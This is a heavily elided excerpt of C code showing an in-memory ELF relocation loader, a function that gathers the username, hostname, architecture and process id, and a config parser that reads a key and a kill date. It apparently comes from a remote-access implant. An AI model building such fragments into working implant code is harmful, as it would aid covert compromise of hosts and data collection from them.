            ...
            for (int j = 0; j < shdr[i].sh_size / sizeof(Elf32_Rel); j += 1) {
                ...
                switch (ELF32_R_TYPE(rel[j].r_info)) {
                    ...
                    case R_386_PC32:
                        ...
                        dprintf("R_386_PC32\t[0x%08x] = \t 0x%08x + 0x%08x - 0x%08x\n", rel[j].r_offset, *rel_dst, rel_syms[ELF32_R_SYM(rel[j].r_info)].st_value + base_addr,
                                rel[j].r_offset + base_addr);
...
char* get_os_data() {
    ...
    string_len = snprintf(NULL, 0, "%s;%s;%s;%s;%d;%d", passwd->pw_name, kernel_info.nodename, kernel_info.nodename, kernel_info.machine, pid, 2) +
                 1; // pls one to allow for termination
    ...
    *config_p = malloc(sizeof(struct config));
    ...
    do {
        ...
        if (startswith(config_ptr, "key=")) {
            ...
            config->kill_date = strtoll(config_ptr, NULL, 0);
